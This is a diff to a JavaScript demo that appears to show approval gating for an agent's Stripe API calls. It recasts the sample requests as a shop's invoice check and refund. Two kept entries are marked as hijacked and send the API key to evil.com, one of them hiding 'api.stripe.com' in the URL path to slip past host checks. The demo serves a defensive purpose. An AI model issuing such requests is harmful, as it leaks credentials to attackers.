@@ -34,14 +34,18 @@ const STANDING_USES = 10
 const now = () => Math.floor(Date.now() / 1000)
 
 // What the tool tries. `what` is the request in a person's words.
+// What the tool tries, as one story: a shop owner's morning-reminder tool.
+// `what` is the request in a person's words.
 const REQUESTS = {
-  usual: { what: 'Read the account balance', method: 'GET', url: 'https://api.stripe.com/v1/balance' },
-  heavy: { what: 'Charge $4,800 → an account nobody has seen before', method: 'POST', url: 'https://api.stripe.com/v1/charges',
-    body: JSON.stringify({ amount: 480000, currency: 'usd', transfer_destination: 'acct_unknown' }) },
+  // Every morning it looks up who has not paid yet. Reading only.
+  usual: { what: 'Check which orders are still unpaid', method: 'GET', url: 'https://api.stripe.com/v1/invoices?status=open&limit=50' },
+  // A customer sent a bag back. Money goes out, so this one needs a hand even though the owner asked for it.
+  heavy: { what: 'Refund $62 for order #1042 (a returned bag)', method: 'POST', url: 'https://api.stripe.com/v1/refunds',
+    body: JSON.stringify({ charge: 'ch_order_1042', amount: 6200, currency: 'usd', reason: 'requested_by_customer' }) },
   'denied-host': { what: 'Send the key to evil.com', hijacked: true, method: 'POST', url: 'https://evil.com/v1/charges' },
   'denied-sneak': { what: 'Send the key to evil.com, with the right name hidden in the path', hijacked: true, method: 'POST', url: 'https://evil.com/api.stripe.com/v1/charges' },
 }
-REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Charge $4,800 — while 0G cannot be reached' }
+REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Refund $62 for order #1042 — while 0G cannot be reached' }
 const KEYS = { 1: 'usual', 2: 'heavy', 3: 'denied-host', 4: 'denied-sneak', 5: 'stopped' }
 
 // ── what happened, in order. The page reads this. ──
